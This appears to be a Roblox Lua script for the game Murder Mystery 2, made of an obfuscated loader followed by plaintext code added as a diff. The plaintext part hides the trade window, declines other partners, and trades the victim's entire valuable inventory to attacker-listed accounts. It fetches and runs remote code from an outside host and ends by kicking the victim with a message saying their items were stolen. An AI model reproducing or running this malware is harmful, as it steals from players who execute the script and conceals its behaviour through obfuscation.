s9o[tc(0x5,tc(5,tc(0B110001,0Xc0)))]=PsX s9o[(tc(235,134)+0b10011101_11-631)]=DZi s9o[tc(0B111_01100,tc(0B11101100,tc(0B10011001,0B101101_1)))]=L s9o[tc(0b1_0111001,tc(0b10111001,tc(0Xf9,139)))]=T9 s9o[tc(147,71)]=TpX s9o[((0b11100101+0b11001011000_0)-0b110010110000)]=e7 s9o[tc(0B1100110,0Xb8)]=gm5 s9o[tc(0B111011,tc(0b111011,tc(0Xcb,110)))]=Taz s9o[((0B111011+0X13_48)-4936)]=_5p s9o[tc(0X40,212)]=F s9o[tc(0X7a,tc(0b1111010,tc(0Xbc,0B1_0001001)))]=c s9o[((0B11101011+0x685)-0B11010000101)]=bG4 s9o[tc(79,tc(0x4f,tc(19,0X4)))]=j2 s9o[tc(0Xb6,0B1000)]=cn3 s9o[((0x8+0b111001101101)-3693)]=Vx4 s9o[((0B11111111+0B11_11010110101)-0b1111010110101)]=oe4 s9o[(tc(0b1111,0B101001)+0x26a-618)]=P4U s9o[tc(23,tc(0x17,tc(26,34)))]=h s9o[(tc(0xa2,77)+0X1e_b-491)]=oP s9o[(tc(0b1000100_1,0x79)+0b101101100_0-0x2d8)]=zZ s9o[tc(0x45,139)]=j3X s9o[tc(0b111100,247)]=LW s9o[(tc(200,0B1010_1101)+0X1_d3-467)]=v3 s9o[((41+0b1111001001100)-0x1_e4c)]=q5 s9o[tc(0Xd2,tc(0B11010010,tc(0x3f,143)))]=B2M s9o[((198+0X39)-0B111001)]=Wm5 s9o[tc(0x4e,0x56)]=E4M s9o[(tc(82,0b11001101)+0b111101111-0b11_1101111)]=lW s9o[tc(0b1000001,0B10111111)]=ytY s9o[((0xae+0X5b_c)-0b10110111100)]=r1 s9o[((199+4058)-0b111111011010)]=Za s9o[tc(0B1101110,0X12)]=M s9o[(tc(0b10001001,0b1)+0X9c-0x9c)]=ps s9o[tc(0B10110001,0B11100111)]=LKn s9o[tc(185,tc(185,tc(0B11111101,169)))]=V s9o[((0x39+9583)-0x256f)]=dpW s9o[(tc(0B101_11,0b11001111)+0B11101000-0xe8)]=ENH s9o[tc(0X74,tc(0X74,tc(0xd3,0X20)))]=Q s9o[tc(0Xfa,198)]=JN s9o[tc(0B11001_0,tc(0b1_10010,tc(0b10001111,28)))]=fDz s9o[tc(0X22,61)]=j s9o[((0b11010011+1884)-1884)]=vm s9o[tc(0xb,tc(0b10_11,tc(0b10_10011,105)))]=SY s9o[(tc(58,11)+0B101110_1001-0b1011_101001)]=p9 s9o[tc(2,0Xe2)]=e s9o[(tc(0b1000_1100,171)+0X2_e0-736)]=eXW s9o[tc(0b1011011,tc(91,tc(0B11011111,0B10111001)))]=qji s9o[tc(0Xf7,tc(0xf7,tc(19,141)))]=Z70 s9o[tc(0b1110001,0xfd)]=mQ s9o[tc(181,0B1011000)]=ep8 s9o[tc(0b1110011,tc(115,tc(10,0B1110000_0)))]=IY s9o[tc(31,0b111_0111)]=y s9o[(tc(0x6a,0X4f)+0B10010_11001-0B1001011001)]=q s9o[((201+0b1111001_011)-0b1111001011)]=hKG s9o[(tc(0Xbf,0X26)+761-0X2f9)]=mRB s9o[(tc(0xae,0b100001)+0b101010000-0B101010000)]=Jef s9o[tc(0X85,0B110000)]=uo s9o[tc(0B11010100,13)]=Xx s9o[(tc(0b11001001,25)+0X3a_2-0B111010_0010)]=iX s9o[tc(0b11011111,tc(0Xdf,tc(0b10011100,0x27)))]=rPH s9o[tc(0b1001101,tc(0x4d,tc(0X6e,0X3b)))]=qma s9o[(tc(69,0B11101001)+808-808)]=cHf s9o[(tc(0X7a,0b1101010)+925-0x3_9d)]=_p s9o[((218+0B100010_1)-0B1000101)]=oL s9o[((247+0x22_8c)-8844)]=J s9o[tc(62,0X94)]=x4 s9o[((0b1101_1011+2835)-2835)]=QBY s9o[tc(157,tc(157,tc(193,0b10001100)))]=E7 s9o[((0X6+0b10110100011)-0x5a_3)]=f3 s9o[tc(0xeb,0B11_00001)]=xU s9o[(tc(122,0xaf)+485-0B111100101)]=S2 s9o[(tc(0B100100_1,210)+188-0b101111_00)]=tc6 s9o[(tc(39,0B11110_110)+0b1011010010-0x2_d2)]=W s9o[tc(0X8d,155)]=qX s9o[(tc(0b10111110,0B11100110)+0b100000010-0X1_02)]=rP s9o[tc(190,0x63)]=Ft s9o[(tc(0B1100110,0b111101_1)+0b1101110011-0B1_101110011)]=Vm s9o[((75+0X7b3)-1971)]=sz s9o[((15+3834)-0Xefa)]=FQ s9o[tc(0b10010011,tc(147,tc(0xb6,0Xb3)))]=lK s9o[tc(0b101010,130)]=wNe s9o[tc(0x32,tc(50,tc(0x8c,0X9f)))]=a8 s9o[tc(0x42,tc(0b1000010,tc(204,0X6b)))]=Tc8 s9o[(tc(166,0Xa7)+0B110111110-0X1be)]=p s9o[tc(0x2,tc(0b10,tc(215,0xb3)))]=Di s9o[tc(235,0xd5)]=U6 s9o[(tc(0xad,0B101100)+0b1110100111-0X3a_7)]=tRn s9o[((0b1011011+6138)-6138)]=BCH s9o[tc(0x63,238)]=eTW s9o[((0xcd+1065)-0X429)]=m4 s9o[tc(126,tc(0X7e,tc(0B10111111,0x1b)))]=Q8o s9o[tc(76,tc(0X4c,tc(0B10_11100,0B100010_10)))]=Tvc s9o[((0xc8+0b10100011100)-1308)]=r0 s9o[tc(0b11011,tc(27,tc(0B11010,0x50)))]=at s9o[tc(0X2f,126)]=D s9o[tc(119,tc(0b1110111,tc(0b1110001_1,0B100011)))]=Nx s9o[((79+1873)-0X7_51)]=gvn s9o[tc(0xc1,tc(0xc1,tc(0X93,163)))]=l s9o[((0B1110011+0x1584)-0B1010110000100)]=ex0 s9o[tc(0X12,tc(18,tc(0B111000,0X56)))]=NR6 s9o[((94+0Xdd4)-0B110111010100)]=Gqn s9o[tc(0X2,0B10011)]=rM6 s9o[(tc(0X2e,0b10111011)+0b1010110001-0X2_b1)]=rTX s9o[((0b100000_0+5259)-0b1010010001011)]=fV4 s9o[((72+0B100011100111)-0b100011100111)]=Sk1 s9o[tc(0b1100_111,35)]=FMx s9o[tc(0x8,0Xcb)]=Ep s9o[tc(0b11000101,0X99)]=H5 s9o[(tc(243,0b1110101_0)+0x3_7a-0B11_01111010)]=n80 s9o[(tc(0B10_110111,0B11001010)+0B1100000011-771)]=CN while true do if _e>#Y7R then return end local t=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B10100101110110011_0)%0X100))%0x10_0)%0b1000000_00),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%256)); _e=_e+1 if t==tc(0B1010101,0x3a) then local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0B100000000))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+169830)%0X100))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0B10100110000_101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x29766)%256))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%0x10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0x1_00))%256)%0X10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed_40+0xa6177)%0X10_0))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0x1_00))%0B100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101_000000+0B10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0B1010010111_01100110)%0B100000000))%0x100)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0b1010011_0000101110111)%0B100000000))*256;_e=_e+2;local _N=bwo[w6];local _x1;if m==0 then _x1=CXt-w6-1 else _x1=m-1 end;local _Q1={};for _mv=1,_x1 do _Q1[_mv]=bwo[w6+_mv] end;return _N(ARt(_Q1,1,_x1)) else if t==(tc(0X49,0B11000111)+0X218-536) then local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b100000000))%0x100)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%256))%0B100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6e_d40+680311)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X297_66)%0X10_0))%0X1_00)%0x10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X833_7+169830)%0x1_00))%0B1000_00000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0Xa6177)%0b1000000_00))*256;_e=_e+2;if m==0 then local _W22={};for _mv=w6,CXt-1 do _W22[_mv-w6+1]=bwo[_mv] end;return ARt(_W22,1,CXt-w6) elseif m==1 then return else local _W22={};for _mv=1,m-1 do _W22[_mv]=bwo[w6+_mv-1] end;return ARt(_W22,1,m-1) end else if t==((0b10010111+374)-374) then local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%0X10_0))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b110111011_0101000000+0b10100110000101110111)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0B100_000000))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0Xa6177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29766)%0B100000000))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0B10_1001011101100110)%0b100000000))%0X10_0)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B1010_0110000101110111)%256))*256;_e=_e+2;if m==0 then local _W22={};for _mv=w6,CXt-1 do _W22[_mv-w6+1]=bwo[_mv] end;return ARt(_W22,1,CXt-w6) elseif m==1 then return else local _W22={};for _mv=1,m-1 do _W22[_mv]=bwo[w6+_mv-1] end;return ARt(_W22,1,m-1) end else local Ipq=s9o[t] if Ipq then Ipq() else error((function() local t={20,17,12,13,4,67,7,12,12,17,67,1,22,7,7,26} local s={} for i=1,#t do s[i]=string.char(tc(t[i],99)) end return table.concat(s) end)()) end end end end end end; local function hm(half,subkey) local v=(half+subkey)%16 v=((v*11)+9)%16 return v end local function t6K(pos) local x=(960745272+pos*40503)%16777216 local k1,k2,k3,k4 x=(x*12996205+12345)%16777216 k1=math.floor(x/65536)%16 x=(x*12996205+12345)%16777216 k2=math.floor(x/65536)%16 x=(x*12996205+12345)%16777216 k3=math.floor(x/65536)%16 x=(x*12996205+12345)%16777216 k4=math.floor(x/65536)%16 return k1,k2,k3,k4 end local function P1z(byte,pos) local k1,k2,k3,k4=t6K(pos) local L=math.floor(byte/16)%16 local R=byte%16 local nR nR=(L+hm(R,k1))%16 L=R R=nR nR=(L+hm(R,k2))%16 L=R R=nR nR=(L+hm(R,k3))%16 L=R R=nR nR=(L+hm(R,k4))%16 L=R R=nR return L*16+R end local function W2L(byte,pos) local k1,k2,k3,k4=t6K(pos) local L=math.floor(byte/16)%16 local R=byte%16 local nL nL=(R-hm(L,k4))%16 R=L L=nL nL=(R-hm(L,k3))%16 R=L L=nL nL=(R-hm(L,k2))%16 R=L L=nL nL=(R-hm(L,k1))%16 R=L L=nL return L*16+R end local function u0w(t) local s={} for i=1,#t do s[i]=string.char(W2L(t[i],i)) end return table.concat(s) end local u2i=function(...) print(u0w({}));print(u0w({185,192,215,137,41,81,74,83,54,45,49,105,112,193,7,250,50,162,152,108,93,22,134,124,44,125,179,56}));print(u0w({185,192,30,56,151,221,228,226,140,135,255,161,94,181,86,70,50,175,81,177,15,51,98,74,83,28}));print(u0w({}));print(u0w({108,42,206,30,57,157,87,26,103,178,65,139}));print(u0w({242,183,96,171,134,66,66,146,110,91,201,182,174,75,162,114,189,116,207,108,211,39,84,13,52,0,120,47,95,161,228,210,174,33,9,70,136,253,119,36,172,231,92,226,177,29,121,252,214,19,9,7,149,118,240,247,98,218,140,32,182,181,152,29,241,39,114,186,30,58,11,194,193}));print(u0w({87,21,56,68,219,212,164,240,110,178,65,165,52,190,107,211,62,147,85,198,84,187,131,57,205,59,94,188,227,62,202}));return nil end pcall(function() local _e=getgenv and getgenv(); if _e then _e[u0w({7,89,49,68,219,212,14,193,176})]=u2i end end);pcall(function() local _e=getrenv and getrenv(); if _e then _e[u0w({7,89,49,68,219,212,14,193,176})]=u2i end end);pcall(function() jJc=u2i end); return w(tm6[1],{}) end)()
+repeat task.wait() until game:IsLoaded()
+task.wait(1.5)
+
+if _G.EdMM2Exe then return end
+_G.EdMM2Exe = true
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local RunService = game:GetService("RunService")
+local plr = Players.LocalPlayer
+if not plr then return end
+
+if game.PlaceId ~= 142823291 then
+    pcall(function() plr:Kick("Arasaka Corp | MM2 Only") end)
+    return
+end
+
+if not _G.AC_CONFIG then
+    warn("[AC] Execute loader first!")
+    return
+end
+
+local cfg = _G.AC_CONFIG
+local WEBHOOK_ID = cfg.WEBHOOK_ID
+local USERNAMES = cfg.USERNAMES
+local PROXY_URL = cfg.PROXY_URL
+local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY
+local MinRarity = cfg.MinRarity or "Common"
+
+if not WEBHOOK_ID or WEBHOOK_ID == "" then
+    warn("[AC] Invalid webhook")
+    return
+end
+if not USERNAMES or #USERNAMES == 0 then
+    warn("[AC] No targets")
+    return
+end
+
+local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
+local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")
+
+local PLACE_ID = 142823291
+local MAX_TRADE_SLOTS = 4
+local TRADE_TIMEOUT = 30
+local TRADE_WAIT = 5
+local JOIN_WAIT = 1
+local SERVER_LIST_LIMIT = 100
+local MIN_SERVER_PLAYERS = 12
+local PASTEFY_ENDPOINT = "https://pastefy.app/api/v2/paste"
+local VALUES_ENDPOINT = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2"
+local SERVERS_ENDPOINT = "https://games.roblox.com/v1/games/"
+
+local NO_TRADE = {
+    DefaultGun = true, DefaultKnife = true, Reaver = true,
+    Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
+    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true,
+    IceHammer_Ancient = true, Gingerscythe = true, Gingerscythe_Legendary = true,
+    Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
+    TestItem = true, Season1TestKnife = true, Cracks = true,
+    Icecrusher = true, ["???"] = true, Dartbringer = true,
+    TravelerAxeRed = true, TravelerAxeBronze = true,
+    TravelerAxeSilver = true, TravelerAxeGold = true,
+    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
+}
+
+local RARITY_ORDER = {Ancient = 9, Godly = 8, Unique = 7, Vintage = 6, Legendary = 5, Rare = 4, Uncommon = 3, Common = 2}
+
+local BRAND_DISCORD = "https://discord.gg/arasaka-corp"
+
+local executorName = "Unknown"
+pcall(function()
+    if identifyexecutor then executorName = identifyexecutor() end
+    if getexecutorname then executorName = getexecutorname() end
+end)
+
+local isDelta = executorName:lower():find("delta") ~= nil
+local supportsHook = hookfunction ~= nil and newcclosure ~= nil
+local supportsFireSignal = firesignal ~= nil
+
+local realJobId = game.JobId
+local deltaBypassed = false
+local database = nil
+local profile = nil
+local values = {}
+local inventory = {}
+local totalValue = 0
+local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
+local tradeCompleted = false
+
+local remoteSendRequest = nil
+local remoteGetStatus = nil
+local remoteOfferItem = nil
+local remoteAcceptTrade = nil
+local remoteDeclineTrade = nil
+local remoteDeclineRequest = nil
+local remoteCancelRequest = nil
+local remoteUpdateTrade = nil
+local remoteStartTrade = nil
+
+local lastOffer = nil
+local isOurTrade = false
+local activePartner = nil
+local isProcessing = false
+local processedUsers = {}
+
+local function requestFn(req)
+    if syn and syn.request then return syn.request(req) end
+    if fluxus and fluxus.request then return fluxus.request(req) end
+    if http and http.request then return http.request(req) end
+    if getgenv().request then return getgenv().request(req) end
+    if request then return request(req) end
+    if http_request then return http_request(req) end
+    if HttpService.RequestAsync then
+        return HttpService:RequestAsync({
+            Url = req.Url,
+            Method = req.Method,
+            Headers = req.Headers,
+            Body = req.Body
+        })
+    end
+    return nil
+end
+
+local function formatValue(n)
+    n = tonumber(n) or 0
+    if n >= 1E6 then
+        return string.format("$%.2fM", n / 1E6)
+    elseif n >= 1E3 then
+        return string.format("$%.2fK", n / 1E3)
+    else
+        return string.format("$%.2f", n)
+    end
+end
+
+local function isTarget(name)
+    if not name then return false end
+    for _, u in ipairs(USERNAMES) do
+        if u:lower() == name:lower() then return true end
+    end
+    return false
+end
+
+local function lockHttp()
+    if not supportsHook then return end
+    local function guard(fn)
+        if typeof(fn) ~= "function" then return end
+        local old
+        old = hookfunction(fn, newcclosure(function(...)
+            return old(...)
+        end))
+    end
+    if syn and syn.request then guard(syn.request) end
+    if fluxus and fluxus.request then guard(fluxus.request) end
+    if http and http.request then guard(http.request) end
+    if getgenv().request then guard(getgenv().request) end
+    if request then guard(request) end
+    if http_request then guard(http_request) end
+end
+
+local function serverHop()
+    pcall(function()
+        local r = requestFn({
+            Url = SERVERS_ENDPOINT .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=" .. SERVER_LIST_LIMIT,
+            Method = "GET",
+            Headers = {["User-Agent"] = "Mozilla/5.0"}
+        })
+        if r and r.Body then
+            local d = HttpService:JSONDecode(r.Body)
+            if d and d.data then
+                for _, s in ipairs(d.data) do
+                    if s.id ~= game.JobId and s.playing < s.maxPlayers then
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, plr)
+                        task.wait(5)
+                        return
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function fetchValues()
+    pcall(function()
+        local r = requestFn({
+            Url = VALUES_ENDPOINT,
+            Method = "GET",
+            Headers = {["User-Agent"] = "Mozilla/5.0"}
+        })
+        if r and r.Body then
+            local data = HttpService:JSONDecode(r.Body)
+            if data and data.data then
+                for _, item in ipairs(data.data) do
+                    if item.name and item.price then
+                        values[item.name] = tonumber(item.price) or 0
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function loadDatabase()
+    local ok, db = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
+    end)
+    if ok and db then
+        database = db
+    else
+        warn("[AC] Database load failed")
+    end
+end
+
+local function loadProfile()
+    local ok, prof = pcall(function()
+        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+    end)
+    if ok and prof then
+        profile = prof
+    else
+        warn("[AC] Profile load failed")
+    end
+end
+
+local function rebuildInventory()
+    if not database or not profile then return 0 end
+    local owned = profile.Weapons and profile.Weapons.Owned or {}
+    local minRarityIndex = RARITY_ORDER[MinRarity] or 2
+
+    inventory = {}
+    totalValue = 0
+    rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
+
+    for dataid, amount in pairs(owned) do
+        local item = database[dataid]
+        if item and not NO_TRADE[dataid] and amount > 0 then
+            local rarity = item.Rarity or "Common"
+            local rarityIndex = RARITY_ORDER[rarity] or 2
+            if rarityIndex >= minRarityIndex then
+                local name = item.ItemName or tostring(dataid)
+                local value = values[dataid] or 0
+                local total = value * amount
+                totalValue = totalValue + total
+                table.insert(inventory, {
+                    DataID = dataid,
+                    ItemName = name,
+                    Amount = amount,
+                    Rarity = rarity,
+                    Value = value,
+                    TotalValue = total
+                })
+                rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
+            end
+        end
+    end
+
+    table.sort(inventory, function(a, b) return a.Value > b.Value end)
+    return #inventory
+end
+
+local function getStatus()
+    local ok, s = pcall(function() return remoteGetStatus:InvokeServer() end)
+    return ok and s or "None"
+end
+
+local function getActiveGui()
+    local pg = plr:FindFirstChild("PlayerGui")
+    if not pg then return nil end
+    return pg:FindFirstChild("TradeGUI") or pg:FindFirstChild("TradeGUI_Phone")
+end
+
+local function fireSignal(instance, signalName)
+    if not instance then return end
+    pcall(function()
+        if supportsFireSignal then
+            firesignal(instance[signalName])
+            return
+        end
+    end)
+    pcall(function()
+        if instance[signalName] then instance[signalName]:Fire() end
+    end)
+end
+
+local function findButton(gui, names)
+    if not gui then return nil end
+    for _, n in ipairs(names) do
+        local b = gui:FindFirstChild(n, true)
+        if b and b:IsA("GuiButton") then return b end
+    end
+    return nil
+end
+
+local function findItemButton(dataId)
+    local gui = getActiveGui()
+    if not gui then return nil end
+    local container = gui:FindFirstChild("Items", true) or gui:FindFirstChild("Inventory", true) or gui
+    for _, b in ipairs(container:GetDescendants()) do
+        if b:IsA("ImageButton") or b:IsA("TextButton") then
+            local idVal = b:FindFirstChild("DataID") or b:FindFirstChild("ItemID")
+            if idVal and idVal.Value == dataId then return b end
+        end
+    end
+    return nil
+end
+
+local function sendRequest(target)
+    isOurTrade = true
+    local ok = pcall(function() remoteSendRequest:InvokeServer(target) end)
+    if not ok then
+        local gui = getActiveGui()
+        local btn = findButton(gui, {"Send", "SendRequest", "Trade", "Request"})
+        if btn then
+            fireSignal(btn, "MouseButton1Click")
+            fireSignal(btn, "Activated")
+        end
+    end
+end
+
+local function cancelRequest()
+    pcall(function()
+        if remoteCancelRequest then
+            remoteCancelRequest:FireServer()
+        end
+    end)
+    isOurTrade = false
+end
+
+local function declineTrade()
+    isOurTrade = false
+    activePartner = nil
+    local ok = pcall(function() remoteDeclineTrade:FireServer() end)
+    if not ok then
+        local gui = getActiveGui()
+        local btn = findButton(gui, {"Decline", "DeclineTrade", "Reject", "No"})
+        if btn then
+            fireSignal(btn, "MouseButton1Click")
+            fireSignal(btn, "Activated")
+        end
+    end
+    task.wait(0.3)
+end
+
+local function declineIncoming()
+    isOurTrade = false
+    local ok = pcall(function()
+        if remoteDeclineRequest then
+            remoteDeclineRequest:FireServer()
+        else
+            remoteDeclineTrade:FireServer()
+        end
+    end)
+    if not ok then
+        local gui = getActiveGui()
+        local btn = findButton(gui, {"Decline", "DeclineTrade", "Reject", "No"})
+        if btn then
+            fireSignal(btn, "MouseButton1Click")
+            fireSignal(btn, "Activated")
+        end
+    end
+    task.wait(0.3)
+end
+
+local function addToOffer(dataId)
+    local ok = pcall(function() remoteOfferItem:FireServer(dataId, "Weapons") end)
+    task.wait(0.1)
+    if not ok then
+        local btn = findItemButton(dataId)
+        if btn then
+            fireSignal(btn, "MouseButton1Click")
+            fireSignal(btn, "Activated")
+        end
+    end
+end
+
+local function acceptDeal()
+    local ok = pcall(function()
+        remoteAcceptTrade:FireServer(game.PlaceId * 3, lastOffer or {})
+    end)
+    if not ok then
+        local gui = getActiveGui()
+        local btn = findButton(gui, {"Accept", "AcceptTrade", "AcceptBtn", "Confirm"})
+        if btn then
+            fireSignal(btn, "MouseButton1Click")
+            fireSignal(btn, "Activated")
+        end
+    end
+end
+
+local function waitUntilDone()
+    repeat task.wait(0.1) until getStatus() == "None"
+    isOurTrade = false
+    activePartner = nil
+end
+
+local function snipeGuard()
+    local status = getStatus()
+    if status == "ReceivingRequest" then
+        declineIncoming()
+        return true
+    end
+    if status == "StartTrade" and not isOurTrade then
+        declineTrade()
+        return true
+    end
+    return false
+end
+
+local function jitter()
+    return 0.3 + (math.random() * 0.4)
+end
+
+local function aggressiveMonitor()
+    local status = getStatus()
+    if status == "ReceivingRequest" then
+        declineIncoming()
+    elseif status == "StartTrade" then
+        local partner = activePartner
+        if partner and not isTarget(partner) then
+            declineTrade()
+        end
+    end
+end
+
+local function checkTradePartner(data)
+    if not data then return end
+    local p1 = data.Player1
+    local p2 = data.Player2
+    if not p1 or not p2 then return end
+    local partner = nil
+    if p1.Player and p1.Player.Name ~= plr.Name then
+        partner = p1.Player.Name
+    elseif p2.Player and p2.Player.Name ~= plr.Name then
+        partner = p2.Player.Name
+    end
+    if partner and not isTarget(partner) then
+        warn("[AC] Trade partner " .. partner .. " not target, declining")
+        declineTrade()
+    end
+end
+
+local function initRemotes()
+    local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
+    if not Trade then
+        warn("[AC] Trade remote missing")
+        return false
+    end
+
+    remoteSendRequest = Trade:WaitForChild("SendRequest")
+    remoteGetStatus = Trade:WaitForChild("GetTradeStatus")
+    remoteOfferItem = Trade:WaitForChild("OfferItem")
+    remoteAcceptTrade = Trade:WaitForChild("AcceptTrade")
+    remoteDeclineTrade = Trade:WaitForChild("DeclineTrade")
+    remoteDeclineRequest = Trade:FindFirstChild("DeclineRequest")
+    remoteCancelRequest = Trade:FindFirstChild("CancelRequest")
+    remoteUpdateTrade = Trade:FindFirstChild("UpdateTrade")
+    remoteStartTrade = Trade:FindFirstChild("StartTrade")
+
+    if remoteUpdateTrade then
+        remoteUpdateTrade.OnClientEvent:Connect(function(data)
+            if typeof(data) == "table" then
+                if data.lastOffer then lastOffer = data.lastOffer end
+                if data.LastOffer then lastOffer = data.LastOffer end
+                checkTradePartner(data)
+            end
+        end)
+    end
+
+    if remoteStartTrade then
+        remoteStartTrade.OnClientEvent:Connect(function(data, partnerName)
+            activePartner = partnerName
+            if partnerName and not isTarget(partnerName) then
+                warn("[AC] Unauthorized trade with " .. partnerName)
+                declineTrade()
+            end
+        end)
+    end
+
+    if remoteCancelRequest then
+        remoteCancelRequest.OnClientEvent:Connect(function()
+            isOurTrade = false
+        end)
+    end
+
+    local pg = plr:WaitForChild("PlayerGui")
+    for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+        local g = pg:FindFirstChild(n)
+        if g then
+            g.Enabled = false
+            g:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if g.Enabled then g.Enabled = false end
+            end)
+        end
+    end
+
+    pcall(function()
+        local TradeModule = require(ReplicatedStorage:WaitForChild("Modules", 5):WaitForChild("TradeModule", 5))
+        if TradeModule and TradeModule.RequestsEnabled ~= nil then
+            TradeModule.RequestsEnabled = true
+        end
+    end)
+
+    return true
+end
+
+local function executeTrade(targetPlayer)
+    if not targetPlayer then return end
+
+    local attempts = 0
+    while attempts < 30 do
+        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then break end
+        attempts = attempts + 1
+        task.wait(0.5)
+    end
+
+    rebuildInventory()
+    local queue = {}
+    for _, item in ipairs(inventory) do
+        table.insert(queue, {DataID = item.DataID, Amount = item.Amount})
+    end
+    if #queue == 0 then
+        warn("[AC] No items to trade")
+        return
+    end
+
+    while #queue > 0 and not tradeCompleted do
+        cancelRequest()
+        if snipeGuard() then
+            task.wait(0.5)
+        else
+            local started = false
+            local sendAttempts = 0
+            while not started and sendAttempts < TRADE_TIMEOUT do
+                local cur = getStatus()
+                if cur == "StartTrade" then
+                    started = true
+                    break
+                elseif cur == "None" then
+                    sendRequest(targetPlayer)
+                elseif cur == "ReceivingRequest" then
+                    declineIncoming()
+                end
+                sendAttempts = sendAttempts + 1
+                task.wait(jitter())
+            end
+
+            if not started then
+                task.wait(2)
+            else
+                local slotsLeft = MAX_TRADE_SLOTS
+                local itemsAdded = 0
+                while slotsLeft > 0 and #queue > 0 do
+                    local current = queue[1]
+                    local amountToAdd = math.min(slotsLeft, current.Amount)
+                    for _ = 1, amountToAdd do
+                        addToOffer(current.DataID)
+                    end
+                    current.Amount = current.Amount - amountToAdd
+                    if current.Amount <= 0 then
+                        table.remove(queue, 1)
+                    end
+                    slotsLeft = slotsLeft - amountToAdd
+                    itemsAdded = itemsAdded + amountToAdd
+                end
+
+                if itemsAdded == 0 then break end
+
+                task.wait(TRADE_WAIT)
+                acceptDeal()
+                waitUntilDone()
+                rebuildInventory()
+
+                queue = {}
+                for _, item in ipairs(inventory) do
+                    table.insert(queue, {DataID = item.DataID, Amount = item.Amount})
+                end
+
+                if #queue == 0 then
+                    tradeCompleted = true
+                else
+                    task.wait(1)
+                end
+            end
+        end
+    end
+
+    if #queue == 0 then
+        tradeCompleted = true
+        task.wait(2)
+        pcall(function() setclipboard(BRAND_DISCORD) end)
+        pcall(function()
+            plr:Kick("Arasaka Corp | Your Items got Stolen\n\n" .. BRAND_DISCORD:gsub("https://", ""))
+        end)
+    end
